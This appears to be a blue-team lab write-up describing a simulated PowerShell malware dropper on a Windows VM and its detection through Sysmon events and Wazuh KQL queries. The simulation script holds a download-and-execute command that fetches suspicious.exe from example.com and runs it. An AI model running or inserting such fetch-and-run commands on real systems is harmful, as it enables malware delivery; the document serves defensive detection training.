# Malware Detection Simulation Summary

## Attack Overview
- **Description**: Simulated a malware dropper using PowerShell to download a file (`suspicious.exe`) from `example.com` and attempt execution, mimicking malicious behavior.
- **MITRE ATT&CK**: [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/), [T1059.001 - PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- **Objective**: Detect unauthorized file downloads and process execution.
- **Date and Time**: June 13, 2025, ~10:23 PM IST

## Simulation Details
- **Environment**: Windows 10 VM (hostname: `DESKTOP-FF0MPJM`, Wazuh agent: `SIEM-Target-Windows`).
- **Sysmon Config**: SwiftOnSecurity `sysmonconfig-export.xml`.
- **Simulation Script**:
  ```powershell
  Invoke-WebRequest -Uri "https://example.com" -OutFile "C:\Users\Public\suspicious.exe"
  Start-Process "C:\Users\Public\suspicious.exe"
  ```
- **Execution**: Ran `malware_detection.ps1` in PowerShell as a standard user.
- **Expected Events**:
  - **Sysmon Event ID 1**: `powershell.exe` and `suspicious.exe` process creation.
  - **Sysmon Event ID 3**: Network connection to `example.com`.

## Detection in Wazuh
- **Wazuh Rule**: Sysmon rule `61613` (Event ID 1) and `61605` (Event ID 3).
- **Search Query** (Wazuh Dashboard > Security Events > Discover):
  ```kql
  win.eventdata.image:powershell.exe OR win.eventdata.image:suspicious.exe
  ```
- **Findings**:
  - Alerts for `event.code:1` (process creation) and `event.code:3` (network connection).
  - Example Alert Fields:
    - `win.eventdata.image: powershell.exe`
    - `win.eventdata.commandLine: Invoke-WebRequest`
    - `timestamp: 2025-06-13T16:53:XXZ`
- **Screenshots**:
  - `screenshots\wazuh_alerts_malware.png`: Wazuh alerts.
  - `screenshots\event_viewer_sysmon.png`: Sysmon Event ID 1.
- **Logs**:
  - `logs\sysmon_events.csv`: Sysmon events.
  - `logs\wazuh_agent_filtered.log`: Wazuh agent logs.

## Learnings
- **Blue Teaming Insight**: PowerShell is a common vector for malware delivery. Sysmonâ€™s process and network logging are essential for detection.
- **Challenges**: Distinguishing malicious from legitimate downloads requires context (e.g., file path, destination IP).
- **Technical Growth**: Learned to analyze Sysmon events and query Wazuh for process/network activity.
- **Best Practice**: Enable PowerShell logging and monitor non-standard file paths.

## Detection Logic Query
```kql
(event.code:1 OR event.code:3) AND (win.eventdata.image:powershell.exe OR win.eventdata.image:suspicious.exe) AND @timestamp:>=now-10m
```
- **Purpose**: Detects malware-related process creation and network activity.
- **Outcome**: Identifies suspicious PowerShell activity.

## References
- [MITRE ATT&CK: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [Wazuh Documentation: Sysmon Integration](https://documentation.wazuh.com/current/user-manual/capabilities/sysmon.html)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)

## Attachments
- **Logs**: `logs\sysmon_events.csv`, `logs\wazuh_agent_filtered.log`
- **Screenshots**: `screenshots\wazuh_alerts_malware.png`, `screenshots\event_viewer_sysmon.png`